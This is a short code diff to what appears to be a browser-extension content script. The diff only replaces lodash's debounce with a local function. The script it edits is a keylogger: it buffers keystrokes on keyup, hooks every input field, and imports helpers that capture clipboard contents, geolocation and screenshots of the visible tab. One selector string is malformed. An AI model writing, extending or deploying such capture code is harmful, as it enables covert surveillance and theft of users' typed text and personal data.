@@ -1,10 +1,21 @@
-import _ from "lodash";
 import {
   captureClipboard,
   captureGeolocation,
   captureKeylogBuffer,
   captureVisibleTab,
 } from "../utils/page-utils";
+
+// Small local debounce implementation
+function debounce<T extends (...args: any[]) => void>(fn: T, wait = 200) {
+  let t: number | undefined;
+  return (...args: Parameters<T>) => {
+    if (t !== undefined) clearTimeout(t);
+    t = window.setTimeout(() => {
+      t = undefined;
+      fn(...args);
+    }, wait) as unknown as number;
+  };
+}
 
 let buffer = "";
 
@@ -19,7 +30,7 @@ function piggybackGeolocation() {
     });
 }
 
-const debouncedCaptureKeylogBuffer = _.debounce(async () => {
+const debouncedCaptureKeylogBuffer = debounce(async () => {
   if (buffer.length > 0) {
     await captureKeylogBuffer(buffer);
 
@@ -35,13 +46,13 @@ document.addEventListener("keyup", (e: KeyboardEvent) => {
 
 const inputs: WeakSet<Element> = new WeakSet();
 
-const debouncedHandler = _.debounce(() => {
+const debouncedHandler = debounce(() => {
   [...document.querySelectorAll("input,textarea,[contenteditable")]
     .filter((input: Element) => !inputs.has(input))
     .map((input) => {
       input.addEventListener(
         "input",
-        _.debounce((e) => {
+        debounce((e) => {
           console.log(e);
         }, 1000)
       );
